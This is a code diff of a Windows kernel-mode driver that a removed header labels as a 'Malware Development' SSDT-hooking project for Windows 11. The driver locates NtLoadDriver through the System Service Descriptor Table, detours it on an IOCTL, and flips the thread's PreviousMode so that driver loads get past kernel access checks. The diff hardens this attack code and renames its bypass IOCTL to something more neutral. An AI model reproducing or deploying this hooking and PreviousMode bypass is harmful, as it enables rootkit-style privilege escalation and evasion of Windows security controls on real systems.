@@ -1,19 +1,3 @@
-/*
-╔═════════════════════════════════════════════════════════════╗
-║                                                             ║
-║                 ⚠️  Malware Development  ⚠️                   ║
-║                                                             ║
-║  @author: bekoo                                             ║
-║  @website : 0xbekoo.github.io                               ║
-║  @warning : This project has been developed                 ║
-║              for educational purposes only.                 ║
-║                                                             ║
-║  @project: SSDT Hooking - KernelMode Driver                 ║
-║  @platform: Windows 11 24H2 (Build: 26100.3194)             ║
-║                                                             ║
-╚═════════════════════════════════════════════════════════════╝
-*/
-
 #pragma warning(disable:4996)
 
 #include "main.h"
@@ -26,36 +10,45 @@ PVOID g_NtLoadDriverAddress = NULL;
 NTSTATUS HookedNtLoadDriver(PUNICODE_STRING DriverServiceName) {
 	UNICODE_STRING UserBuffer;
 	BOOLEAN PreviousStatus = FALSE;
+	NTSTATUS Status = STATUS_SUCCESS;
 
 	HkRestoreFunction((PVOID)g_NtLoadDriverAddress, (PVOID)OriginalNtLoadDriver);
+	if (DriverServiceName->Buffer == NULL || DriverServiceName->Length == 0) {
+		DbgPrintEx(0, 0, "Invalid DriverServiceName\n");
+		return STATUS_INVALID_PARAMETER;
+	}
 
 	UserBuffer.Buffer = ExAllocatePoolWithTag(NonPagedPool, DriverServiceName->Length, 'buff');
 	if (UserBuffer.Buffer == NULL) {
 		return STATUS_INSUFFICIENT_RESOURCES;
 	}
 	UserBuffer.Length = DriverServiceName->Length;
-	UserBuffer.MaximumLength = DriverServiceName->Length;
+	UserBuffer.MaximumLength = DriverServiceName->MaximumLength;
 
-	RtlCopyMemory(UserBuffer.Buffer, DriverServiceName->Buffer, DriverServiceName->Length);
+	__try {
+		RtlCopyMemory(UserBuffer.Buffer, DriverServiceName->Buffer, DriverServiceName->Length);
+	}
+	__except (EXCEPTION_EXECUTE_HANDLER) {
+		DbgPrintEx(0, 0, "Exception occurred during RtlCopyMemory\n");
+		ExFreePoolWithTag(UserBuffer.Buffer, 'buff');
+		return GetExceptionCode();
+	}
 	DbgPrintEx(0, 0, "Driver: %wZ\n", &UserBuffer);
 
 	PreviousStatus = ChangePreviousMode(0);
 	if (!PreviousStatus) {
-		return STATUS_UNSUCCESSFUL;
+		goto Clean;
 	}
 
 	_NtLoadDriver NtLoadDriver = (_NtLoadDriver)g_NtLoadDriverAddress;
-	NTSTATUS Status = NtLoadDriver(&UserBuffer);
-	if (!NT_SUCCESS(Status)) {
-		goto Clean;
-	}
+	Status = NtLoadDriver(&UserBuffer);
 
 Clean:
 	PreviousStatus = ChangePreviousMode(1);
 	if (!PreviousStatus) {
-        if (Status == 0) {
+		if (Status == 0) {
 			Status = STATUS_UNSUCCESSFUL;
-        }
+		}
 	}
 
 	ExFreePoolWithTag(UserBuffer.Buffer, 'buff');
@@ -127,14 +120,14 @@ NTSTATUS IoControl(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
 	BOOLEAN Value;
 	switch (Stack->Parameters.DeviceIoControl.IoControlCode) {
 
-	case IOCTL_BYPASS_PREVIOUS_MODE:
+	case IOCTL_TRAMPOLINE:
 		Value = *(PBOOLEAN)Irp->AssociatedIrp.SystemBuffer;
 		if (!Value) {
 			Irp->IoStatus.Status = STATUS_INVALID_DEVICE_REQUEST;
 			Irp->IoStatus.Information = 0;
 			break;
 		}
-		DbgPrintEx(0, 0, "IOCTL code received (IOCTL_BYPASS_PREVIOUS_MODE)\n");
+		DbgPrintEx(0, 0, "IOCTL_TRAMPOLINE code received\n");
 
 		HkDetourFunction((PVOID)g_NtLoadDriverAddress, (PVOID)HookedNtLoadDriver, 20, (PVOID*)&OriginalNtLoadDriver);
 
@@ -155,19 +148,17 @@ NTSTATUS IoControl(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
 VOID UnloadDriver(PDRIVER_OBJECT DriverObject) {
 	UNREFERENCED_PARAMETER(DriverObject);
 
-	UNICODE_STRING SymName = RTL_CONSTANT_STRING(L"\\??\\MyDriverr");
+	UNICODE_STRING SymName = RTL_CONSTANT_STRING(L"\\??\\MyDriver");
 	DbgPrintEx(0, 0, "Unloading the Driver...\n");
 
 	IoDeleteSymbolicLink(&SymName);
 	IoDeleteDevice(DriverObject->DeviceObject);
-
-	DbgPrintEx(0, 0, "Driver Unloaded!\n");
 }
 
 NTSTATUS DriverEntry(PDRIVER_OBJECT	DriverObject, PUNICODE_STRING RegistryPath) {
 	UNREFERENCED_PARAMETER(RegistryPath);
-	UNICODE_STRING DeviceName = RTL_CONSTANT_STRING(L"\\Device\\MyDriverr");
-	UNICODE_STRING SymName = RTL_CONSTANT_STRING(L"\\??\\MyDriverr");
+	UNICODE_STRING DeviceName = RTL_CONSTANT_STRING(L"\\Device\\MyDriver");
+	UNICODE_STRING SymName = RTL_CONSTANT_STRING(L"\\??\\MyDriver");
 	PDEVICE_OBJECT DeviceObject;
 	NTSTATUS Status;
 
@@ -193,9 +184,15 @@ NTSTATUS DriverEntry(PDRIVER_OBJECT	DriverObject, PUNICODE_STRING RegistryPath) 
 	PVOID SSDTAddress = GetSSDTAddress(fKeAddSystemAddress);
 	DbgPrintEx(0, 0, "SSDT Address: 0x%p\n", SSDTAddress);
 
+	/*
+		Offset = SSDT + 4 * SSN
+	*/
 	UINT32 Offset = *(PUINT32)((PUCHAR)SSDTAddress + 4 * SSN_NTLOADDRIVER);
 	DbgPrintEx(0, 0, "Offset: 0x%x\n", Offset);
 
+	/*
+		RoutineAddress = SSDT + (Offset >>> 4)
+	*/
 	g_NtLoadDriverAddress = (PVOID)((PUCHAR)SSDTAddress + (Offset >> 4));
 	DbgPrintEx(0, 0, "NtLoadDriver Address: 0x%p\n\n", g_NtLoadDriverAddress);
 
